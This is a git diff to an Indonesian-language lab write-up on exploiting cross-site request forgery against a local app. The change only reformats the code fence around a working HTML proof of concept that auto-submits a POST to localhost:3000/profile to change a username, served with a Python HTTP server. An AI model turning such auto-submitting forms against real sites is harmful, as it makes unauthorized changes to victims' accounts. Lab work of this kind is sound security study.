@@ -18,7 +18,8 @@
    - Untuk mengeksploitasi CSRF, buat sebuah file HTML dengan form yang secara otomatis mengirimkan request POST ke URL `http://localhost:3000/profile`.
    - Form tersebut menggunakan metode POST dan menyertakan parameter username yang diubah menjadi nilai baru, misalnya "HelloAkuAisyah".
    - Berikut adalah kode HTML punyaku untuk melakukan CSRF:
-     ```<html>
+     ```html
+<html>
 <body>
   <form action="http://localhost:3000/profile" method="POST">
     <input type="hidden" name="username" value="HelloAkuAisyah" />
@@ -26,7 +27,8 @@
   <script>document.forms[0].submit();</script>
 </body>
 </html>
-``` 
+```
+
 <img width="1237" height="458" alt="image" src="https://github.com/user-attachments/assets/23e008a0-931b-4006-8d90-e51e7b57a24f" />
 
   - Jalankan server Python pada port 8000 untuk meng-host file HTML ini menggunakan perintah: `python -m http.server 8000`
